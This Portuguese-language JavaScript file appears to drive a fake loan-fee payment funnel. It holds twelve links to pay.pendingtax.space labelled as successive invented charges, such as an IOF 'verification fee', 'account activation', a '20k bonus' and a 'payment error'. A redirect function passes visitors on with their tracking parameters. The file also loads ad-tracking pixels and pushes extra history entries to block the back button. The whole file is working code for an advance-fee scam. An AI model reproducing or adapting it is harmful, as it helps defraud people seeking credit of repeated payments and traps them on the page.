const baseLinks = {
    up1: "https://pay.pendingtax.space/a9ArZMlR8R837xj", // IOF
    up2: "https://pay.pendingtax.space/meABG9d0p0vZ6Ea", // Taxa de verificação de IOF
    up3: "https://pay.pendingtax.space/NDr8gmKrerRZBmj", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.pendingtax.space/65XDZB8YAY4gVJw", // NFe
    up5: "https://pay.pendingtax.space/n1NLgwJqpqbGMxE", // Ativar conta
    up6: "https://pay.pendingtax.space/BNjzgPl8a8rgM78", // Taxa de registro do contrato
    up7: "https://pay.pendingtax.space/nQ7kZ7poAoLG0eJ", // Parabéns, 20k adicional
    up8: "https://pay.pendingtax.space/RmA83EaMNMO3PVp", // Erro no pagamento - 14,06
    up9: "https://pay.pendingtax.space/2wq7Gr78p88gBAN", // APP - 11,99
    up10:"https://pay.pendingtax.space/1VOvGV4dod93D62", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.pendingtax.space/nWrxGWA4l4o3654",// Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.pendingtax.space/KV603ko7p7L3w8y" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}



// UTMIFY, troque o pixel só aqui, belê?
(function() {
 window.googlePixelId = "68cf86530ee8895acecf4b7b";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
  document.head.appendChild(a);
})();


(function() {
    const script = document.createElement('script');
    
    script.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    script.setAttribute('data-utmify-prevent-xcod-sck', '');
    script.setAttribute('data-utmify-prevent-subids', '');
    script.async = true;
    script.defer = true;

    document.head.appendChild(script);
})();


// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);

history.pushState({}, '', location.href);
